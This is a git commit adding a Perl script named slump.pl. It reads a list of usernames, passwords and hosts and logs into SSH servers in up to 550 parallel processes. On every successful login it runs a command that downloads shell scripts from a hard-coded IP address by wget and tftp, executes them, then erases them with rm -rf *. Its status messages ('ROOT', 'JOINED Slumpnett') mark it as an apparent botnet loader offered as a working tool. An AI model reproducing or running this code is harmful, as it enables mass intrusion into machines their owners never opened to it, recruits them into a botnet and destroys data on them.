7481466954b2f0ae7dcd41414ad6a651a9535663
Exophobian <64628322+Exophobian@users.noreply.github.com>
2021-01-26 02:14:43 -0100

    Add files via upload

---
+++ slump.pl
@@ -0,0 +1,32 @@
+#!/usr/bin/perl
+use Net::SSH2; use Parallel::ForkManager;
+
+$file = shift @ARGV;
+open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
+push(@newarray,@array);
+
+}
+my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
+scalar(@newarray); $i+=3) {
+        $pm->start and next;
+        $a = $i;
+        $b = $i+1;
+        $c = $i+2;
+        $ssh = Net::SSH2->new();
+        if ($ssh->connect($newarray[$c])) {
+                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
+                        $channel = $ssh->channel();
+                        $channel->exec('cd /tmp || cd /run || cd /; wget http://161.35.166.115/axisbins.sh; chmod 777 axisbins.sh; sh axisbins.sh; tftp 161.35.166.115 -c get axistftp1.sh; chmod 777 axistftp1.sh; sh axistftp1.sh; tftp -r axistftp2.sh -g 161.35.166.115; chmod 777 axistftp2.sh; sh axistftp2.sh; rm -rf axisbins.sh axistftp1.sh axistftp2.sh; rm -rf *');
+                        sleep 10;
+                        $channel->close;
+                        print "\e[35;1mLoading [\x1b[1;32mS L U M P\x1b[1;35m] ROOT ~>: ".$newarray[$c]."\n";
+                } else {
+                        print "\e[34;1mScanning \x1b[1;35mSSH\n";
+                }
+        } else {
+                print "\e[36;1mLoading [\x1b[1;32mGOOFY\x1b[1;37m] JOINED Slumpnett\n";
+        }
+        $pm->finish;
+}
+$pm->wait_all_children;
+
